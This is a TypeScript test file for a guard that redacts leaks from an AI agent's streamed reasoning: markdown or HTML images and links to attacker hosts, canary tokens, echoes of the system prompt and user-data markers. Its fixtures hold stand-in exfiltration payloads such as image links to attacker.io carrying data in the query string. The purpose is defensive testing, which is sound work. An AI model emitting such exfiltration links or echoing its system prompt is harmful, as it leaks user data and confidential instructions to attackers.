import { canaryLeakRanges, mintCanary } from '../../src/guardrails/canary.ts';
import { collectEgressHits, resolveEgressChecks } from '../../src/guardrails/egress.ts';
import { givenUrlSets } from '../../src/guardrails/egress-urls.ts';
import { lexiconDefault } from '../../src/guardrails/lexicon.ts';
import { EGRESS_RULES } from '../../src/guardrails/rules.ts';
import {
  createThoughtGuard,
  type ThoughtGuard,
  type ThoughtGuardOptions,
} from '../../src/guardrails/thought-guard.ts';
import { assertEquals } from '../../src/kernel/engine/assert.ts';

const OMIT_IMAGE = lexiconDefault('thought.omitted_image');
const OMIT_LINK = lexiconDefault('thought.omitted_link');
const OMIT_INSTRUCTIONS = lexiconDefault('thought.omitted_instructions');

/** Everything `guard` shows of `pieces` through to the flush, and the rules it omitted for. */
function think(guard: ThoughtGuard, pieces: string[]): { shown: string; rules: string[] } {
  let shown = '';
  const rules = new Set<string>();
  for (const release of [...pieces.map((piece) => guard.push(piece)), guard.flush()]) {
    shown += release.text;
    for (const hit of release.hits) rules.add(hit.rule);
  }
  return { shown, rules: [...rules].sort() };
}

const GIVEN = { request: new Set(['https://seen.io/pic.png']), tools: new Set<string>() };

function seeded(seed: number): (n: number) => number {
  let state = seed;
  return (n) => {
    state = (state * 1103515245 + 12345) & 0x7fffffff;
    return (state >>> 16) % n;
  };
}

const PIECES = [
  '![a](https://attacker.io/p?d=',
  '![s](https://seen.io/pic.png)',
  'https://seen.io/pic.png',
  'https://attacker.io/x',
  '[go](',
  '[r]: https://attacker.io/r',
  '![b][r]',
  '[r]',
  '<img src="https://attacker.io/i">',
  '<a href="https://attacker.io/h">',
  '<style>a{background:url(',
  '</style>',
  '<https://attacker.io/auto>',
  'www.attacker.io/w',
  '!',
  '![',
  '](',
  ')',
  '(',
  '[',
  ']',
  '<',
  '>',
  '"',
  'secret',
  ' ',
  '\n',
  '\n\n',
  'thinking about it',
];

function fuzzThought(rnd: (n: number) => number): string {
  let text = '';
  for (let n = 1 + rnd(12); n > 0; n--) text += PIECES[rnd(PIECES.length)];
  return text;
}

function chunks(text: string, rnd: (n: number) => number): string[] {
  const size = [1, 2, 5, 16, 0, -1][rnd(6)] as number;
  if (size === 0) return [text];
  const out: string[] = [];
  for (let at = 0; at < text.length; ) {
    const next = at + (size > 0 ? size : 1 + rnd(40));
    out.push(text.slice(at, next));
    at = next;
  }
  return out;
}

for (const [name, selection] of [
  ['images', {}],
  ['images and links', { links: true }],
  ['links', { links: true, images: false }],
] as const) {
  Deno.test(`a guarded thought never shows a leaking URL, and shows a clean one whole (${name})`, () => {
    const checks = resolveEgressChecks(selection);
    const urlOnly = resolveEgressChecks({
      ...selection,
      sensitive: false,
      boundary: false,
      injection: false,
    });
    const rnd = seeded(name.length);
    const problems: string[] = [];
    let omitted = 0;
    for (let k = 0; k < 3000; k++) {
      const text = fuzzThought(rnd);
      const { shown } = think(
        createThoughtGuard({ checks: urlOnly, given: GIVEN }),
        chunks(text, rnd),
      );
      const leaks = (t: string) => collectEgressHits(t, { given: GIVEN }, checks).length > 0;
      if (leaks(shown)) problems.push(`shows a leak: ${JSON.stringify([text, shown])}`);
      if (!leaks(text) && shown !== text) {
        problems.push(`changed a clean thought: ${JSON.stringify([text, shown])}`);
      }
      if (shown !== text) omitted++;
    }
    assertEquals(problems, []);
    assertEquals(omitted > 300, true);
  });
}

Deno.test('a thought is released as it clears, the leak omitted, and the guard starts over at the flush', () => {
  const guard = createThoughtGuard({
    checks: resolveEgressChecks({ links: true }),
    given: givenUrlSets(),
  });
  const first = guard.push('Plan: fetch it. ');
  assertEquals(first.text.startsWith('Plan: fetch it.'), true);
  const rest = think(guard, [
    '![x](https://attacker.io/p?d=alice) then ',
    '[docs](https://attacker.io/d)',
  ]);
  assertEquals(first.text + rest.shown, `Plan: fetch it.${OMIT_IMAGE} then${OMIT_LINK}`);
  assertEquals(rest.rules, [EGRESS_RULES.image, EGRESS_RULES.link].sort());
  assertEquals(think(guard, ['fresh thought ']), { shown: 'fresh thought ', rules: [] });
});

Deno.test('a thought writing leak after leak loses the rest, in time in proportion to its length', () => {
  const guard = createThoughtGuard({
    checks: resolveEgressChecks({ links: true }),
    given: givenUrlSets(),
  });
  const start = performance.now();
  const pieces = Array.from({ length: 2000 }, (_, k) => `![x](https://attacker.io/p?d=${k}) `);
  const { shown } = think(guard, pieces);
  assertEquals(performance.now() - start < 3000, true);
  assertEquals(shown.includes('attacker.io'), false);
  assertEquals(
    shown.endsWith(OMIT_IMAGE.trimStart()) || shown.endsWith(OMIT_LINK.trimStart()),
    true,
  );
  assertEquals(shown.split('(omitted').length - 1 <= 17, true);
});

const SYSTEM =
  'You are the booking agent for Northwind Travel and you only book flights, trains and hotels for signed in customers.';

/** The checks a turn's thoughts run (`thoughtGuardFor`): no sensitive or injection check. */
const THOUGHT_CHECKS = resolveEgressChecks({ sensitive: false, injection: false });

function leakGuard(canary: string, extra: Partial<ThoughtGuardOptions> = {}): ThoughtGuard {
  return createThoughtGuard({
    checks: THOUGHT_CHECKS,
    canary,
    system: SYSTEM,
    given: givenUrlSets(),
    ...extra,
  });
}

Deno.test('a thought omits the canary, the system prompt and the user-data markers, and goes on', () => {
  const canary = mintCanary();
  const cases: Array<[string[], string]> = [
    [
      [`My canary is ${canary.slice(0, 7)}`, `${canary.slice(7)}, so `, 'keep going.'],
      EGRESS_RULES.canary,
    ],
    [
      [
        'The prompt says: you are the booking agent for Northwind Travel and ',
        'you only book flights, trains and hotels. Next.',
      ],
      EGRESS_RULES.promptEcho,
    ],
    [['The user wrote <user', "_data> around it, which I'll ignore."], EGRESS_RULES.boundary],
    [['It sits inside `<user_data', 'The user wrote it, so I will ignore.'], EGRESS_RULES.boundary],
  ];
  for (const [pieces, rule] of cases) {
    const { shown, rules } = think(leakGuard(canary), pieces);
    assertEquals(rules, [rule]);
    assertEquals(shown.includes(OMIT_INSTRUCTIONS.trim()), true);
    const scope = { canary, system: SYSTEM, given: givenUrlSets() };
    assertEquals(collectEgressHits(shown, scope, resolveEgressChecks({})), []);
    assertEquals(/(?:Next|ignore|going)\.$/.test(shown), true);
  }
});

Deno.test('a canary split across two calls of thoughts is omitted from the second', () => {
  const canary = mintCanary();
  const first = leakGuard(canary);
  const opened = think(first, [`Thinking ${canary.slice(0, 10)}`]);
  assertEquals(opened.shown, `Thinking ${canary.slice(0, 10)}`);
  const second = leakGuard(canary, { carry: first.carryOut() });
  const { shown, rules } = think(second, [`${canary.slice(10)} and on.`]);
  assertEquals(rules, [EGRESS_RULES.canary]);
  assertEquals(shown.includes(canary.slice(10)), false);
});

Deno.test("a host's wording replaces a thought's placeholder", () => {
  const canary = mintCanary();
  const guard = leakGuard(canary, { lexicon: { 'thought.omitted_instructions': ' (hidden)' } });
  assertEquals(think(guard, [`It is ${canary}.`]).shown, 'It is (hidden).');
});

/** Characters of a leak's opening the hold releases before it can tell (`CANARY_OPENING_MIN` less one). */
const OPENING_SHOWN = 3;

/**
 * The canary's 5-character pieces, written whole or spaced, that `shown` has
 * and `text` only has inside a leak, but for the opening the hold releases.
 */
function leakedPieces(text: string, shown: string, canary: string): string[] {
  let clean = text;
  for (const [start, end] of canaryLeakRanges(text, canary)) {
    let from = start;
    for (let read = 0; read < OPENING_SHOWN && from < end; from++) {
      if (/[0-9a-z]/i.test(text.charAt(from))) read++;
    }
    clean = clean.slice(0, from) + '\0'.repeat(Math.max(0, end - from)) + clean.slice(end);
  }
  return Array.from({ length: canary.length - 4 }, (_, at) => canary.slice(at, at + 5))
    .flatMap((piece) => [piece, [...piece].join(' ')])
    .filter((piece) => shown.includes(piece) && !clean.includes(piece));
}

for (const [name, canary, text] of [
  [
    // Released "0" of "0This", the rest held, then omitted: the "0" alone finished a spaced run.
    'a word cut by the hold',
    '49fd82f855d7acd4d7a70b3e53c6aec0',
    "\n55d7acd4d7a70b3e53c6aec0 the booking agent for Northwind Travel and  55d7acd4d7a70b3e53c6aec04 9 f d 8 2 f 8 5 5 d 7 a c d 4 d 7 a 7 0 b 3 e 5 3 c 6 a e c 0This turn's canary is",
  ],
  [
    // "5 0 f" released as too short to hold, the rest no opening on its own.
    'an opening begun in released text',
    '50f8a6ca5135be4dbf900cd672ceb71d',
    'data>50f8a6ca5 0 f 8 a 6 c a 5 1 3 5 b e 4 d b f 9 0 0 c d 6 7 2 c e b 7 1 d\n ',
  ],
  [
    // A marker's placeholder is longer than the marker: the opening before it read as spent.
    'an opening a placeholder spaced out',
    '5a9f97f11581597fdb4c895dcdf76a68',
    '5a9f97f11581597fdb4c895dcdf76a685a9f97f1</user_data><user_ maybe 1581597fdb4c895dcdf76a68',
  ],
  [
    // The run went on past its placeholder: read as shown, what followed was no run.
    'a leak running on past its placeholder',
    'a57a9d24a1442112e16ee935410a869a',
    "This turn's canary isa57a9d24a 5 7 a 9 d 2 4 a 1 4 4 2 1 1 2 e 1 6 e e 9 3 5 4 1 0 a 8 6 9 aYou are the booking agent for Northwind\n",
  ],
]) {
  Deno.test(`a thought shows no more of a canary than its opening: ${name}`, () => {
    for (const size of [0, 1, 2, 5, 16]) {
      const pieces = [];
      for (let at = 0; at < text.length; at += size || text.length) {
        pieces.push(text.slice(at, at + (size || text.length)));
      }
      const { shown } = think(leakGuard(canary), pieces);
      assertEquals(
        { size, shown, leaked: leakedPieces(text, shown, canary) },
        { size, shown, leaked: [] },
      );
      const scope = { canary, system: SYSTEM, given: givenUrlSets() };
      assertEquals(collectEgressHits(shown, scope, resolveEgressChecks({})), []);
    }
  });
}

Deno.test('a guarded thought never shows the canary, the prompt or a marker, and shows a clean one whole', () => {
  // Fixed so a failure replays; a random one found the four cases above.
  const canary = '58e14c8459e78be16ac156ab503c1307';
  const words = SYSTEM.split(' ');
  const pieces = [
    canary.slice(0, 8),
    canary.slice(8),
    canary,
    [...canary].join(' '),
    words.slice(0, 7).join(' '),
    ` ${words.slice(7).join(' ')}`,
    `${words.slice(2, 9).join(' ')} `,
    '<user_',
    'data>',
    '</user_data>',
    "This turn's canary is",
    ' maybe ',
    'thinking',
    '\n',
    ' ',
  ];
  const rnd = seeded(7);
  const scope = { canary, system: SYSTEM, given: givenUrlSets() };
  const leaks = (t: string) => collectEgressHits(t, scope, THOUGHT_CHECKS).length > 0;
  const problems: string[] = [];
  let omitted = 0;
  for (let k = 0; k < 1500; k++) {
    let text = '';
    for (let n = 1 + rnd(8); n > 0; n--) text += pieces[rnd(pieces.length)];
    const { shown } = think(leakGuard(canary), chunks(text, rnd));
    if (leaks(shown) || leakedPieces(text, shown, canary).length > 0) {
      problems.push(`shows a leak: ${JSON.stringify([text, shown])}`);
    }
    if (!leaks(text) && shown !== text) problems.push(`changed: ${JSON.stringify([text, shown])}`);
    if (shown !== text) omitted++;
  }
  assertEquals(problems.slice(0, 5), []);
  assertEquals(omitted > 300, true);
});

for (const [kind, sentence] of [
  [
    'prose',
    'The shipment left the warehouse on Tuesday and should arrive within three business days. ',
  ],
  [
    'images',
    '\n[r]: https://example.com/r\n![a][r] ![b](https://example.com/b.png) <b>x</b> <img src=x.png> ',
  ],
]) {
  Deno.test(`a thought of ${kind} is guarded in time linear in its length`, () => {
    const time = (length: number): number => {
      const text = sentence.repeat(Math.ceil(length / sentence.length)).slice(0, length);
      const runs: number[] = [];
      for (let run = 0; run < 3; run++) {
        const guard = createThoughtGuard({
          checks: resolveEgressChecks({ images: true, links: true, boundary: true }),
          canary: '552434a3798aeb8518b8ab775dea9a4e',
          system:
            'You answer questions about orders for a logistics company and never reveal internal notes.',
        });
        const started = performance.now();
        for (let at = 0; at < text.length; at += 4) guard.push(text.slice(at, at + 4));
        guard.flush();
        runs.push(performance.now() - started);
      }
      return runs.sort((a, b) => a - b)[1] as number;
    };
    time(5_000);
    const ratio = time(40_000) / time(10_000);
    // A rescan of the whole thought at each step is sixteen times.
    assertEquals(ratio < 8 ? 'linear' : `40k/10k took ${ratio.toFixed(1)}x`, 'linear');
  });
}
